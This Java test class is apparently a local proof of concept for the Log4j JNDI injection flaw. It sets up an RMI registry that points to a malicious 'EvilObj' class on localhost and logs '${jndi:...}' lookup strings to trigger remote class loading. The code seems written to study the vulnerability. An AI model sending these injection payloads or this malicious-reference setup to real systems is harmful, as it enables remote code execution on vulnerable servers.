package com.bug.log4j;

import com.sun.jndi.rmi.registry.ReferenceWrapper;
import lombok.extern.slf4j.Slf4j;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import org.junit.Test;

import javax.naming.Context;
import javax.naming.InitialContext;
import javax.naming.NamingException;
import javax.naming.Reference;
import java.rmi.Naming;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
import java.util.Properties;

/**
 * Log4jTest class
 *
 * @author 谢小平
 * @date 2021/12/11
 */
@Slf4j
public class Log4jTest2 {
    private static final Logger logger  = LogManager.getLogger();


    public static void main(String[] args) throws NamingException, RemoteException {

        try {
            start();
            Properties env = new Properties();
            env.put(Context.INITIAL_CONTEXT_FACTORY,
                    "com.sun.jndi.rmi.registry.RegistryContextFactory");
            env.put(Context.PROVIDER_URL,
                    "rmi://localhost:1099");
            Context ctx = new InitialContext(env);
            HelloWorld helloWorld = (HelloWorld)ctx.lookup("hello");
//            System.out.println(helloWorld.Hello());
//            System.out.println(helloWorld.HelloWorld());

            String username = "${jndi:ldap://localhost:1099/hello/hello}";
            logger.info("saf,{}",username);
             username = "${jndi:ldap://localhost:1099/hello.hello}";
            logger.info("saf,{}",username);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    @Test
    public void test2() {
        try {
            lanuchRMIregister();
            String username = "${jndi:rmi://localhost:9999/refObj}";
            logger.info("saf,{}",username);

        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static void lanuchRMIregister() throws Exception{
        System.out.println("Creating RMI register...");
        Registry registry = LocateRegistry.createRegistry(1099);
        // 最终下载恶意类的地址为http://127.0.0.1:9999/SpringExploitObj.class
        Reference refObj = new Reference("EvilObj","EvilObj","http://127.0.0.1:9999/");
        //使用ReferenceWrapper包装，其继承了UnicastRemoteObject因此实现了Remote接口
        ReferenceWrapper referenceWrapper = new ReferenceWrapper(refObj);
        registry.bind("refObj",referenceWrapper);
    }

    private static void start() throws Exception{
        RemoteHelloWorld rhw = new RemoteHelloWorld();
        System.out.println("registry is running...");
        //创建注册中心
        LocateRegistry.createRegistry(1099);
        Naming.rebind("rmi://127.0.0.1:1099/hello",rhw);
    }
}
